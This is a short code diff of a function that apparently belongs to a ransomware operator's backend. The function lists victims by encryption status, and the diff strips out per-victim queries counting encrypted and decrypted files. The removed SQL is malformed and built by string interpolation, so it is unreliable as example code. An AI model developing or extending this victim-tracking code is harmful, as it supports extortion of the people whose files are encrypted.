@@ -64,24 +64,7 @@ def get_list_victims(conn):
     victims_list = []
     for victim in victims:
         victims_list.append(list(victim))
-        if victim[4] == 'CRYPT' or victim[4] == 'PENDING':
-            commande = f' SELECT encrypted.nb_files FROM encrypted ,WHERE encrypted.id_victim = {victim[0]} WHERE id_victim = {victim[0]} AND encrypted.datetime = (SELECT MAX(datetime) FROM encrypted WHERE id_victim = {victim[0]})'
-            fichiers = select_data(conn, commande)
-            if fichiers:
-                fichiers = fichiers[0][0]
-            else:
-                fichiers = 0
-            victims_list[x].append(fichiers)
-        if victim[4] == 'DECRYPT':
-            commande = f'SELECT decrypted.nb_files FROM decrypted WHERE decrypted.id_victim = {victim[0]} AND decrypted.datetime = (SELECT MAX(datetime) FROM decrypted WHERE id_victim = {victim[0]})'
-            fichiers = select_data(conn, commande)
-            if fichiers:
-                fichiers = fichiers[0][0]
-            else:
-                nb_files = 0
-            victims_list[x].append(fichiers)
-        else:
-            victims_list[x].append(0)
+        victims_list[x].append(0)
         x += 1
     return victims_list
 
